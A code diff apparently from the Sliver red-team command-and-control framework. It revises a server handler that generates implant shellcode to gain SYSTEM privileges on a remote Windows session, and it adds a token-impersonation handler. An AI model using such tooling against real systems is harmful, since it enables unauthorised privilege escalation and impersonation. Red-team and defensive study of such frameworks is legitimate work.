@@ -20,7 +20,8 @@ package rpc
 
 import (
 	"context"
-	"time"
+	"io/ioutil"
+	"path"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -62,21 +63,29 @@ func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*
 
 // GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
 func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
+	var shellcode []byte
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
 
-	config := generate.ImplantConfigFromProtobuf(req.Config)
-	config.Format = clientpb.ImplantConfig_SHARED_LIB
-	config.ObfuscateSymbols = false
-	dllPath, err := generate.SliverSharedLibrary(config)
+	name := path.Base(req.Config.GetName())
+	shellcode, err := getSliverShellcode(name)
 	if err != nil {
-		return nil, err
-	}
-	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
-	if err != nil {
-		return nil, err
+		name, config := generate.ImplantConfigFromProtobuf(req.Config)
+		if name == "" {
+			name, err = generate.GetCodename()
+			if err != nil {
+				return nil, err
+			}
+		}
+		config.Format = clientpb.ImplantConfig_SHELLCODE
+		config.ObfuscateSymbols = false
+		shellcodePath, err := generate.SliverShellcode(name, config)
+		if err != nil {
+			return nil, err
+		}
+		shellcode, err = ioutil.ReadFile(shellcodePath)
 	}
 	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
 		Data:           shellcode,
@@ -87,8 +96,11 @@ func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*
 		return nil, err
 	}
 
-	timeout := time.Duration(req.Request.Timeout)
+	timeout := rpc.getTimeout(req)
 	data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
+	if err != nil {
+		return nil, err
+	}
 	getSystem := &sliverpb.GetSystem{}
 	err = proto.Unmarshal(data, getSystem)
 	if err != nil {
@@ -97,9 +109,9 @@ func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*
 	return getSystem, nil
 }
 
-// Elevate - Attempt to elevate remote privileges
-func (rpc *Server) Elevate(ctx context.Context, req *sliverpb.ElevateReq) (*sliverpb.Elevate, error) {
-	resp := &sliverpb.Elevate{}
+// MakeToken - Creates a new logon session to impersonate a user based on its credentials.
+func (rpc *Server) MakeToken(ctx context.Context, req *sliverpb.MakeTokenReq) (*sliverpb.MakeToken, error) {
+	resp := &sliverpb.MakeToken{}
 	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
